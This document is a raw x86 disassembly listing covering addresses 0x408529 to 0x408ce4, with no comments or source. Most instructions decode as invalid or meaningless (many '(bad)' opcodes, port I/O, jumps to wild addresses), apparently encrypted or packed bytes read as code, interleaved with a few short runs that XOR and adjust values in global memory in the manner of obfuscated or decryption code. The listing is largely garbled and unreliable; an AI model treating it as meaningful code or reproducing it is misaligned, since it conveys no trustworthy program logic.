  408529:	(bad)  
  40852a:	xchg   ebx,eax
  40852b:	clc    
  40852c:	lods   al,BYTE PTR es:[esi]
  40852e:	out    dx,al
  40852f:	outs   dx,DWORD PTR ds:[esi]
  408530:	repnz pop edx
  408532:	dec    edx
  408533:	xor    al,0x49
  408535:	inc    ecx
  408536:	mov    cl,0x61
  408538:	in     eax,dx
  408539:	adc    BYTE PTR [edx-0x508ddd9d],0x82
  408540:	mov    dh,0x4b
  408542:	push   esi
  408543:	add    DWORD PTR [ebx],esp
  408545:	or     ch,dl
  408547:	les    esi,FWORD PTR [edx]
  408549:	cmp    DWORD PTR [edx],edi
  40854b:	mov    ebp,0x50ed2835
  408550:	dec    edi
  408551:	repnz fdiv QWORD PTR [edx+0x1c9b2856]
  408558:	dec    edi
  408559:	jns    0x408595
  40855b:	pop    es
  40855c:	or     eax,0x6e809ff6
  408561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408562:	imul   esp,DWORD PTR [eax+0x3],0x84056247
  408569:	mov    cl,0x59
  40856b:	test   edi,edx
  40856d:	jb     0x4085aa
  40856f:	hlt    
  408570:	das    
  408571:	shr    BYTE PTR [edx-0x18],1
  408574:	pop    edi
  408575:	xchg   edi,eax
  408576:	mov    ah,0x35
  408578:	sub    BYTE PTR [ebp+0x5c],ch
  40857b:	and    DWORD PTR [ebx],edi
  40857d:	push   esp
  40857e:	daa    
  40857f:	jb     0x4085b5
  408581:	into   
  408582:	xchg   ecx,eax
  408583:	js     0x40850a
  408585:	mov    eax,ds:0x3cd43012
  40858a:	pop    ebx
  40858b:	mov    ecx,0xd217c7e3
  408590:	dec    eax
  408591:	dec    esp
  408592:	inc    edx
  408593:	jne    0x408594
  408595:	pop    ds
  408596:	fist   DWORD PTR [ecx+0x39]
  408599:	mov    esp,0x33818f16
  40859e:	sti    
  40859f:	jno    0x4085ed
  4085a1:	(bad)  
  4085a2:	int3   
  4085a3:	and    BYTE PTR [eax-0x2d1c3170],0xcd
  4085aa:	les    esp,FWORD PTR [edi+0xf]
  4085ad:	push   0x45
  4085af:	jbe    0x4085ea
  4085b1:	xchg   BYTE PTR [eax-0x10],ch
  4085b4:	pop    di
  4085b6:	arpl   WORD PTR [edi-0x50153f99],dx
  4085bc:	stc    
  4085bd:	or     eax,0xc3e6a447
  4085c2:	pop    edx
  4085c3:	mov    bh,0x41
  4085c5:	inc    esp
  4085c6:	ficom  WORD PTR [ebx+0x2d19b362]
  4085cc:	stos   BYTE PTR es:[edi],al
  4085cd:	push   ss
  4085ce:	mov    dl,0x2d
  4085d0:	jp     0x4085ef
  4085d2:	cld    
  4085d3:	ret    0x5894
  4085d6:	in     eax,dx
  4085d7:	sbb    ch,dl
  4085d9:	shl    BYTE PTR [eax+0x2b],0x20
  4085dd:	loopne 0x4085e9
  4085df:	out    0xe0,al
  4085e1:	sub    eax,0x3d175302
  4085e6:	out    0x69,al
  4085e8:	test   BYTE PTR ds:0x48ad3c6b,cl
  4085ee:	dec    eax
  4085ef:	jno    0x4085eb
  4085f1:	inc    esi
  4085f2:	lods   al,BYTE PTR ds:[esi]
  4085f3:	ins    DWORD PTR es:[edi],dx
  4085f4:	dec    esp
  4085f5:	inc    ebp
  4085f6:	cmp    al,BYTE PTR [esi]
  4085f8:	ror    DWORD PTR [edx+edi*1],0x96
  4085fc:	popf   
  4085fd:	jo     0x408613
  4085ff:	jo     0x408646
  408601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408602:	mov    ebx,ebx
  408604:	pop    esp
  408605:	sub    eax,0xbd2448d8
  40860a:	aam    0x41
  40860c:	test   BYTE PTR es:[eax+0x56],bh
  408610:	xor    eax,0xc3e3daea
  408615:	stos   DWORD PTR es:[edi],eax
  408616:	mov    ebp,0x90352ec9
  40861b:	dec    edi
  40861c:	test   BYTE PTR [esi],ch
  40861e:	xchg   BYTE PTR [edx+eiz*2-0x15],ch
  408622:	lahf   
  408623:	sub    dh,al
  408625:	cs out dx,eax
  408627:	cmp    ah,bl
  408629:	adc    ebp,DWORD PTR [esi+0x4]
  40862c:	mov    esp,0xdbbf4fb3
  408631:	shl    al,0x7f
  408634:	int    0xac
  408636:	cmp    BYTE PTR [ebp-0x80],dl
  408639:	sahf   
  40863a:	dec    eax
  40863b:	test   DWORD PTR [esi],edx
  40863d:	stos   DWORD PTR es:[edi],eax
  40863e:	mov    ebx,0x82bedbab
  408643:	xor    eax,0xbbaa2596
  408648:	inc    ecx
  408649:	ret    
  40864a:	sub    ecx,ebp
  40864c:	push   0x677832f9
  408651:	jmp    0x408649
  408653:	icebp  
  408654:	div    DWORD PTR [esi+0x212c9c48]
  40865a:	in     eax,dx
  40865b:	(bad)  
  40865c:	in     eax,dx
  40865d:	jne    0x40862e
  40865f:	pop    ds
  408660:	jns    0x408622
  408662:	jbe    0x4085f0
  408664:	push   eax
  408665:	je     0x408622
  408667:	test   al,0xb2
  408669:	sub    DWORD PTR [esp+eax*2+0x7d732400],esp
  408670:	pop    ecx
  408671:	ret    0x668a
  408674:	mov    al,ds:0x41744310
  408679:	mov    eax,ds:0x85e20c2e
  40867e:	jle    0x408644
  408680:	stos   DWORD PTR es:[edi],eax
  408681:	xor    ebp,edi
  408683:	div    BYTE PTR [esp+ecx*4-0x49]
  408687:	mov    esi,0x1b919338
  40868c:	or     al,BYTE PTR [edx-0x54868283]
  408692:	test   al,0x34
  408694:	add    eax,DWORD PTR [edx+0x45c1bd21]
  40869a:	mov    ebx,0x8e12feb8
  40869f:	adc    DWORD PTR ds:0x433663,0x4335fb
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x4336ef,0x433727
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x7ddf454a],ecx
  4086ca:	ins    BYTE PTR es:[edi],dx
  4086cb:	mov    dl,dh
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	jecxz  0x408686
  4086d5:	mov    ebx,0x736ba040
  4086da:	sbb    eax,0xf57e3ddf
  4086df:	(bad)  
  4086e0:	in     al,0x31
  4086e2:	ins    BYTE PTR es:[edi],dx
  4086e3:	imul   eax,DWORD PTR [ecx+0x3e602fa8],0xffffffa2
  4086ea:	or     ebx,ebp
  4086ec:	xchg   esp,eax
  4086ed:	xor    BYTE PTR [edi+0x5fa152c1],dl
  4086f3:	ss add eax,0x210e4766
  4086f9:	jno    0x408760
  4086fb:	pop    edi
  4086fc:	mov    esp,esi
  4086fe:	ss inc ebp
  408700:	(bad)  
  408701:	pop    eax
  408702:	pop    ebp
  408703:	jmp    0xe31118be
  408708:	xor    al,0x48
  40870a:	shr    BYTE PTR [esi-0x710f392c],cl
  408710:	aas    
  408711:	popa   
  408712:	int    0x4b
  408714:	loope  0x40877f
  408716:	dec    edi
  408717:	addr16 fs and ebp,esp
  40871b:	(bad)  
  40871c:	in     eax,0x44
  40871e:	dec    edx
  40871f:	cdq    
  408720:	xor    cl,bh
  408722:	or     eax,0x488cc76
  408727:	dec    esi
  408728:	in     al,dx
  408729:	fcomp  QWORD PTR [edi-0x6c]
  40872c:	fadd   st,st(7)
  40872e:	dec    eax
  40872f:	pop    ds
  408730:	aam    0xcc
  408732:	js     0x408735
  408734:	jns    0x408703
  408736:	xor    DWORD PTR [ebx+0x51],0x93710845
  40873d:	(bad)  
  40873e:	xchg   ecx,eax
  40873f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408740:	ins    DWORD PTR es:[edi],dx
  408741:	mov    ah,0x8e
  408743:	hlt    
  408744:	scas   eax,DWORD PTR es:[edi]
  408745:	loopne 0x408799
  408747:	push   ebx
  408748:	sub    eax,0xa79629ad
  40874d:	jmp    0x643c844f
  408752:	and    ebx,edi
  408754:	jmp    0x6db79af
  408759:	inc    BYTE PTR [esp+esi*2+0x7d]
  40875d:	ficom  DWORD PTR [eax]
  40875f:	rcr    BYTE PTR [eax+0x21],1
  408762:	fwait
  408763:	inc    ecx
  408764:	mov    dl,0xf9
  408766:	dec    edx
  408767:	xchg   esi,eax
  408768:	push   edx
  408769:	pop    ebp
  40876a:	add    DWORD PTR ss:[ebx+0x4f],edi
  40876e:	adc    eax,0x18201816
  408773:	pop    ds
  408774:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408775:	inc    esp
  408776:	nop
  408777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408778:	xchg   DWORD PTR [esi+0x52b31872],ebx
  40877e:	and    al,ah
  408780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408781:	adc    edi,DWORD PTR [ebp-0x61]
  408784:	aaa    
  408785:	dec    esp
  408786:	xchg   DWORD PTR [esi-0x1f238dfb],esi
  40878c:	lock jne 0x40872a
  40878f:	pop    ebp
  408790:	sbb    BYTE PTR [bx+0x14],cl
  408794:	aaa    
  408795:	mov    DWORD PTR [esp+ebx*2],eax
  408798:	sbb    eax,esp
  40879a:	dec    ebx
  40879b:	stos   BYTE PTR es:[edi],al
  40879c:	getsec 
  40879e:	and    DWORD PTR [eax-0x50a53428],eax
  4087a4:	scas   al,BYTE PTR es:[edi]
  4087a5:	jo     0x4087a5
  4087a7:	outs   dx,DWORD PTR ds:[esi]
  4087a8:	scas   eax,DWORD PTR es:[edi]
  4087a9:	fcmove st,st(6)
  4087ab:	iret   
  4087ac:	sub    cl,cl
  4087ae:	(bad)  
  4087b0:	inc    ebx
  4087b1:	(bad)  
  4087b2:	sahf   
  4087b3:	add    DWORD PTR [esi],edx
  4087b5:	dec    ecx
  4087b6:	push   ds
  4087b7:	test   eax,0xc68bc036
  4087bc:	mov    eax,0x440b945
  4087c1:	pop    esi
  4087c2:	or     eax,0x738f710
  4087c7:	shr    BYTE PTR [ebp-0x31],0x8b
  4087cb:	inc    ebp
  4087cc:	shl    ecx,cl
  4087ce:	push   es
  4087cf:	dec    edx
  4087d0:	lahf   
  4087d1:	push   ebp
  4087d2:	dec    ecx
  4087d3:	adc    DWORD PTR [esp+eiz*8],ebx
  4087d6:	sub    DWORD PTR [eax-0x73],edx
  4087d9:	das    
  4087da:	lods   eax,DWORD PTR ds:[esi]
  4087db:	clc    
  4087dc:	cdq    
  4087dd:	dec    ebp
  4087de:	dec    ebp
  4087df:	sub    eax,0x2d297747
  4087e4:	aad    0xe4
  4087e6:	sar    al,0x99
  4087e9:	add    DWORD PTR [ecx-0x7b],edi
  4087ec:	mov    DWORD PTR [edi],edx
  4087ee:	pop    edi
  4087ef:	inc    ebx
  4087f0:	xchg   edi,eax
  4087f1:	sub    eax,0xb3977a6a
  4087f6:	rcl    bl,0xe8
  4087f9:	cld    
  4087fa:	mov    al,0xbc
  4087fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087fd:	jne    0x4087d4
  4087ff:	mov    bl,0xc3
  408801:	xchg   edi,eax
  408802:	jle    0x408870
  408804:	addr16 cmp ebp,esi
  408807:	je     0x408797
  408809:	xor    dh,BYTE PTR [edi]
  40880b:	xor    BYTE PTR [esi+0x68],al
  40880e:	lods   al,BYTE PTR ds:[esi]
  40880f:	xor    al,BYTE PTR [edx]
  408811:	push   0x443d6328
  408816:	or     dh,BYTE PTR [eax-0x3b1bacbf]
  40881c:	repz call 0xacc:0x4669a87c
  408824:	aaa    
  408825:	xchg   esi,eax
  408826:	mov    esi,0xaff66268
  40882b:	gs (bad) 
  40882e:	daa    
  40882f:	mov    esi,0x43fab0fd
  408834:	js     0x4087c8
  408836:	mov    bh,0x80
  408838:	or     eax,0x8cf77fe8
  40883d:	add    ebp,DWORD PTR [ecx]
  40883f:	out    0xd,eax
  408841:	adc    esp,ebp
  408843:	pop    edx
  408844:	sar    BYTE PTR [ecx-0x74],1
  408847:	or     BYTE PTR [edx+ebp*4],bl
  40884a:	mov    al,ds:0x1e4534d8
  40884f:	sub    BYTE PTR [eax],0x1
  408852:	ror    DWORD PTR [edi+0x3b],1
  408855:	sub    al,bh
  408857:	mov    dh,0x59
  408859:	xchg   esi,eax
  40885a:	outs   dx,BYTE PTR ds:[esi]
  40885b:	cmp    DWORD PTR [ebx+edx*8],esp
  40885e:	push   0x4449d03c
  408863:	dec    edx
  408864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408865:	sbb    BYTE PTR [ecx+0x40657ed8],bh
  40886b:	sbb    cl,bh
  40886d:	inc    esi
  40886e:	rcr    BYTE PTR [eax-0x8],0x15
  408872:	popa   
  408873:	sbb    cl,dh
  408875:	das    
  408876:	cmp    cl,BYTE PTR [ebp-0x5f]
  408879:	fs jg  0x408833
  40887c:	mov    bh,BYTE PTR [esp+esi*8]
  40887f:	jb     0x408862
  408881:	shl    DWORD PTR [eax+ebp*4-0x26da615c],0x9c
  408889:	pop    eax
  40888a:	das    
  40888b:	jecxz  0x4088a6
  40888d:	(bad)  
  40888e:	fadd   DWORD PTR [edi-0x3a]
  408891:	push   0xffffffdd
  408893:	fimul  DWORD PTR [ecx-0x19]
  408897:	sahf   
  408898:	add    eax,0x8764f04e
  40889d:	aaa    
  40889e:	dec    eax
  40889f:	mov    esp,0x5748479b
  4088a4:	mov    bh,0xe6
  4088a6:	pop    esp
  4088a7:	ror    BYTE PTR [ecx+0x28],cl
  4088aa:	jne    0x4088e4
  4088ac:	retf   
  4088ad:	in     al,0xbf
  4088af:	xchg   DWORD PTR [esi+0x33],ecx
  4088b2:	aad    0xa4
  4088b4:	mov    ebp,0x81b12f56
  4088b9:	push   ds
  4088ba:	loopne 0x408926
  4088bc:	mov    ch,0x39
  4088be:	iret   
  4088bf:	lock (bad) 
  4088c1:	call   0x6f465baa
  4088c6:	lea    esp,[esi-0x7f5a28ae]
  4088cc:	cmp    bh,bh
  4088ce:	pop    es
  4088cf:	jl     0x408859
  4088d1:	and    dh,ah
  4088d3:	inc    esi
  4088d4:	in     al,0x1d
  4088d6:	test   al,0xe4
  4088d8:	retf   
  4088d9:	pushf  
  4088da:	jo     0x408954
  4088dc:	xchg   edi,eax
  4088dd:	dec    ecx
  4088de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088df:	fcmovne st,st(6)
  4088e1:	arpl   WORD PTR [esi],di
  4088e3:	ins    BYTE PTR es:[edi],dx
  4088e4:	out    dx,al
  4088e5:	dec    eax
  4088e6:	fst    DWORD PTR [eax-0x74]
  4088e9:	inc    esp
  4088ea:	cmp    ch,BYTE PTR [edx]
  4088ec:	iret   
  4088ed:	gs adc al,0x82
  4088f0:	fsubr  st(3),st
  4088f2:	xchg   ebp,eax
  4088f3:	imul   ebx,DWORD PTR [edx-0x7ee3b8f],0xb2997316
  4088fd:	mov    eax,DWORD PTR [eax]
  4088ff:	xor    DWORD PTR ds:0x433663,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x4336db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433653,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43361f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433727,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0xa4bb512c
  408968:	addr16 mov al,0xd4
  40896b:	jle    0x4089eb
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	mov    bh,0x3f
  408973:	pop    ds
  408974:	cld    
  408975:	sub    eax,0xbb886b2b
  40897a:	mov    ?,edx
  40897c:	jbe    0x408989
  40897e:	cdq    
  40897f:	mov    esp,0xa9f3242b
  408984:	sbb    esp,DWORD PTR [edi+0x68d8f9d5]
  40898a:	push   edx
  40898b:	jl     0x4089c8
  40898d:	or     edx,DWORD PTR [edx-0x5f]
  408990:	push   ebx
  408991:	push   ss
  408992:	fmul   QWORD PTR [edx]
  408994:	jne    0x40898e
  408996:	popa   
  408997:	cmc    
  408998:	mov    ecx,0x24bf5560
  40899d:	ret    
  40899e:	fwait
  40899f:	mov    esp,DWORD PTR [eax+0x46a8f9ef]
  4089a5:	jcxz   0x40897c
  4089a8:	push   ds
  4089a9:	xor    edx,edx
  4089ab:	mov    ebx,0xb108722a
  4089b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089b1:	sub    edx,0x64dbef44
  4089b7:	cs repnz sub al,0x40
  4089bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089bc:	ins    BYTE PTR es:[edi],dx
  4089bd:	scas   al,BYTE PTR es:[edi]
  4089be:	out    0xa1,eax
  4089c0:	scas   al,BYTE PTR es:[edi]
  4089c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089c2:	dec    edi
  4089c3:	add    DWORD PTR [esi-0x58],ebp
  4089c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089c7:	int3   
  4089c8:	repnz idiv DWORD PTR ds:0x3fc3d82
  4089cf:	add    BYTE PTR [ebp+0x33326aaa],cl
  4089d5:	add    al,0xe1
  4089d7:	add    DWORD PTR [edx-0xc396d9a],ebp
  4089dd:	lock out dx,al
  4089df:	call   0xd3325881
  4089e4:	push   esp
  4089e5:	mov    ecx,0xe9ab28e1
  4089ea:	repz mov bl,BYTE PTR [edi-0x2edac36a]
  4089f1:	inc    esp
  4089f2:	lahf   
  4089f3:	add    eax,0x11bdf3e0
  4089f9:	mov    bh,0xef
  4089fb:	adc    BYTE PTR [eax+0x51375fbb],ah
  408a01:	or     BYTE PTR [esi],0x15
  408a04:	jno    0x4089d3
  408a06:	test   BYTE PTR [ebp-0x72],0xd2
  408a0a:	int3   
  408a0b:	imul   eax,esi,0x465553cb
  408a11:	mov    eax,ds:0xacac97f0
  408a16:	enter  0x8ecc,0x6c
  408a1a:	dec    edi
  408a1b:	push   0x55
  408a1d:	nop
  408a1e:	mov    dl,0x18
  408a20:	(bad)  
  408a22:	mov    bh,0x3e
  408a24:	mov    ebx,0xb5471d1e
  408a29:	lods   eax,DWORD PTR ds:[esi]
  408a2a:	pop    ebx
  408a2b:	fwait
  408a2c:	mov    cl,0x7a
  408a2e:	inc    esp
  408a2f:	lock mov al,0x8e
  408a32:	push   ds
  408a33:	pop    eax
  408a34:	adc    eax,0xda54a3d8
  408a39:	cs xor esp,ebp
  408a3c:	mov    bh,0x77
  408a3e:	cwde   
  408a3f:	cmc    
  408a40:	(bad)  
  408a41:	push   esp
  408a42:	jmp    0xbbd21d03
  408a47:	mov    ecx,0x5902385b
  408a4c:	dec    esp
  408a4d:	jnp    0x408a9d
  408a4f:	jae    0x408a4d
  408a51:	mov    DWORD PTR [ebx+0x74],eax
  408a54:	(bad)  
  408a55:	js     0x4089e1
  408a57:	dec    esp
  408a58:	xor    eax,0x2cf73a10
  408a5d:	test   al,0x25
  408a5f:	add    al,0x3b
  408a61:	lods   eax,DWORD PTR ds:[esi]
  408a62:	jmp    0x408a83
  408a64:	mov    sp,0x434e
  408a68:	jbe    0x408a94
  408a6a:	xchg   edx,eax
  408a6b:	fmul   DWORD PTR [ecx]
  408a6d:	sbb    BYTE PTR [eax],bl
  408a6f:	mov    al,ds:0x85a89dec
  408a74:	out    0x33,eax
  408a76:	push   ds
  408a77:	retf   
  408a78:	sbb    eax,0x267c2aaf
  408a7d:	mov    dh,0x83
  408a7f:	lock sub esp,eax
  408a82:	clc    
  408a83:	inc    eax
  408a84:	jle    0x408aab
  408a86:	in     eax,dx
  408a87:	neg    esp
  408a89:	xchg   edi,eax
  408a8a:	xchg   esp,eax
  408a8b:	int    0xbf
  408a8d:	in     eax,0x57
  408a8f:	stos   DWORD PTR es:[edi],eax
  408a90:	adc    al,0x22
  408a92:	icebp  
  408a93:	arpl   WORD PTR [ecx-0x3c],sp
  408a96:	xor    al,0xa2
  408a98:	and    al,0x65
  408a9a:	rol    DWORD PTR [edi-0x65],0x41
  408a9e:	and    eax,DWORD PTR [edi+0x18]
  408aa1:	xchg   BYTE PTR [ebx+0x4abcea50],bh
  408aa7:	pop    ebx
  408aa8:	xchg   ecx,eax
  408aa9:	scas   eax,DWORD PTR es:[edi]
  408aaa:	ss xchg ecx,eax
  408aac:	jle    0x408a58
  408aae:	ret    
  408aaf:	lods   al,BYTE PTR ds:[esi]
  408ab0:	in     eax,0xcf
  408ab2:	fdivrp st(4),st
  408ab4:	fadd   DWORD PTR [esi]
  408ab6:	cmp    dl,BYTE PTR [edi+0x64]
  408ab9:	ins    BYTE PTR es:[edi],dx
  408aba:	dec    ebp
  408abb:	adc    al,0x75
  408abd:	cli    
  408abe:	add    ch,BYTE PTR [edx-0x56df952f]
  408ac4:	enter  0x38c9,0xe1
  408ac8:	adc    dh,dh
  408aca:	jnp    0x408acd
  408acc:	addr16 test eax,0x22a01121
  408ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ad3:	(bad)  
  408ad4:	enter  0x95b5,0xc7
  408ad8:	xchg   esi,eax
  408ad9:	(bad)  
  408ada:	xlat   BYTE PTR ds:[ebx]
  408adb:	in     al,dx
  408adc:	pusha  
  408add:	push   ebx
  408ade:	sbb    ah,BYTE PTR [ecx+0x7]
  408ae1:	sbb    al,0x7d
  408ae3:	mov    cl,0xfd
  408ae5:	and    eax,0x853f829a
  408aea:	xchg   edx,eax
  408aeb:	add    esp,DWORD PTR [edx+0x52]
  408aee:	mov    ?,WORD PTR [ebp-0x211e7530]
  408af4:	cmp    ebx,DWORD PTR [ebp+0x4e677b5d]
  408afa:	sbb    al,0x5f
  408afc:	jns    0x408a96
  408afe:	bound  edx,QWORD PTR [edx-0x61a88b4b]
  408b04:	pop    ss
  408b05:	push   esp
  408b06:	loop   0x408a98
  408b08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b09:	dec    edi
  408b0a:	mov    al,0x91
  408b0c:	xor    edi,DWORD PTR [edx-0x17c5a748]
  408b12:	push   ecx
  408b13:	icebp  
  408b14:	xchg   esp,eax
  408b15:	mov    ecx,DWORD PTR [eax]
  408b17:	leave  
  408b18:	pop    ds
  408b19:	out    dx,al
  408b1a:	jg     0x408b93
  408b1c:	pop    ebp
  408b1d:	pop    ebp
  408b1e:	test   DWORD PTR [edx-0x5287a0a1],esp
  408b24:	das    
  408b25:	sbb    BYTE PTR [ebx-0x219d317e],al
  408b2b:	out    0x8d,al
  408b2d:	xor    BYTE PTR [ebp+0x66],bh
  408b30:	loopne 0x408b56
  408b32:	(bad)  
  408b33:	pushf  
  408b34:	(bad)  
  408b35:	xlat   BYTE PTR ds:[ebx]
  408b36:	pusha  
  408b37:	pop    esi
  408b38:	and    DWORD PTR [ecx+0x5a],ebp
  408b3b:	cdq    
  408b3c:	and    DWORD PTR [edx-0x3198ac88],ecx
  408b42:	jge    0x408bb7
  408b44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b45:	cmp    eax,0xd0e29bd7
  408b4a:	and    BYTE PTR [eax+0x63f375a1],al
  408b50:	imul   esp,eax,0xa54aa23d
  408b56:	ins    BYTE PTR es:[edi],dx
  408b57:	ret    0x295b
  408b5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b5b:	xchg   esp,eax
  408b5c:	mov    eax,0xd9575101
  408b61:	mov    DWORD PTR ds:0x6c3c9552,edx
  408b67:	fsubp  st(0),st
  408b69:	daa    
  408b6a:	xor    edi,DWORD PTR [ebx-0x6db70b38]
  408b70:	popa   
  408b71:	fmul   st,st(2)
  408b73:	push   es
  408b74:	je     0x408bb5
  408b76:	or     ebp,ebp
  408b78:	jmp    0x408bce
  408b7a:	push   es
  408b7b:	mov    ch,0xd1
  408b7d:	mov    al,ds:0x565514ec
  408b82:	mov    esp,0x7ea8139d
  408b87:	pop    edx
  408b88:	imul   ebp,esi,0xb
  408b8b:	lds    eax,FWORD PTR [esi]
  408b8d:	and    DWORD PTR [ebx+0xe],esi
  408b90:	mov    ds:0xcd55d4a2,eax
  408b95:	fsubr  QWORD PTR [eax-0x5b]
  408b98:	imul   ebx,DWORD PTR [ebp+0x3e],0x1d850f
  408b9f:	add    BYTE PTR [eax],al
  408ba1:	mov    eax,DWORD PTR [ebp+0x8]
  408ba4:	mov    ecx,DWORD PTR [ebp-0x10]
  408ba7:	xor    eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	int    0xd2
  408bf2:	mov    edx,0x7ed26677
  408bf7:	jle    0x408c1d
  408bf9:	jl     0x408c79
  408bfb:	jle    0x408bdb
  408bfd:	shl    BYTE PTR [ecx+0x33ec5131],cl
  408c03:	les    ebp,FWORD PTR [eax]
  408c05:	dec    ebp
  408c06:	and    BYTE PTR [ebp-0x42],0x3a
  408c0a:	xor    eax,0x1d773dfa
  408c0f:	mov    edi,0x4c642577
  408c14:	outs   dx,DWORD PTR ds:[esi]
  408c15:	sub    dl,BYTE PTR ds:[ecx]
  408c18:	mul    BYTE PTR [edx+eax*2+0x4f9081d6]
  408c1f:	std    
  408c20:	adc    al,BYTE PTR [ecx+esi*2-0x4cf6e614]
  408c27:	mov    ds:0x39c42b84,eax
  408c2c:	jle    0x408bd6
  408c2e:	test   al,0xa2
  408c30:	jle    0x408bb6
  408c32:	dec    ebp
  408c33:	cdq    
  408c34:	ins    DWORD PTR es:[edi],dx
  408c35:	adc    eax,0x869e2cf5
  408c3a:	js     0x408c33
  408c3c:	mov    cl,0x73
  408c3e:	add    ah,BYTE PTR [edi+0x68]
  408c41:	add    ecx,edx
  408c43:	sar    BYTE PTR [esi+0x4edddaa8],0xb9
  408c4a:	sbb    al,0xd9
  408c4c:	icebp  
  408c4d:	sar    al,0x5b
  408c50:	push   esp
  408c51:	mov    ebp,0x41f5e65e
  408c56:	test   BYTE PTR [eax-0x4c],dl
  408c59:	ss dec esi
  408c5b:	xchg   esp,eax
  408c5c:	imul   edx,ecx,0x4eab4304
  408c62:	into   
  408c63:	and    eax,0x6ed45dd5
  408c68:	vmwrite esp,DWORD PTR ds:0xc6685628
  408c6f:	push   esi
  408c70:	mov    edx,0xf0e65c46
  408c75:	ror    DWORD PTR [eax-0x4e],0x20
  408c79:	jge    0x408c17
  408c7b:	inc    esi
  408c7c:	or     esp,DWORD PTR [ecx+0x3a]
  408c7f:	cmp    edx,ecx
  408c81:	addr16 pop ebp
  408c83:	push   ss
  408c84:	or     al,0x78
  408c86:	mov    bl,0x84
  408c88:	pop    esi
  408c89:	rcr    BYTE PTR [ebx+0x34],0xa4
  408c8d:	shl    DWORD PTR [ebp-0x13],1
  408c90:	mov    edx,0x1cb0c027
  408c95:	xchg   DWORD PTR [eax-0x79],edi
  408c98:	push   0x33
  408c9a:	inc    ecx
  408c9b:	sbb    eax,0x258200d3
  408ca0:	push   esi
  408ca1:	mov    bh,0xc7
  408ca3:	xchg   esp,eax
  408ca4:	push   es
  408ca5:	daa    
  408ca6:	aam    0x90
  408ca8:	test   al,0xf8
  408caa:	lods   al,BYTE PTR ds:[esi]
  408cab:	or     eax,edi
  408cad:	sub    bl,BYTE PTR [edi+0x17b1e098]
  408cb3:	ror    BYTE PTR [ebx+0x690e3e23],0x4d
  408cba:	(bad)  
  408cbb:	rsqrtps xmm4,XMMWORD PTR [bx-0x39fa]
  408cc1:	mov    bh,BYTE PTR [esi+0x35]
  408cc4:	push   eax
  408cc5:	or     BYTE PTR [esi],bh
  408cc7:	mov    dh,0xd5
  408cc9:	xor    eax,0x5b96e0f2
  408cce:	dec    eax
  408ccf:	adc    cl,cl
  408cd1:	jne    0x408cf2
  408cd3:	xchg   BYTE PTR [ebp-0x2f118b53],ah
  408cd9:	(bad)  
  408cda:	out    dx,eax
  408cdb:	jne    0x408c7a
  408cdd:	mov    bh,0x3b
  408cdf:	inc    ebx
  408ce0:	and    al,0xd5
  408ce2:	loopne 0x408cff
  408ce4:	lods   al,BYTE PTR ds:[esi]
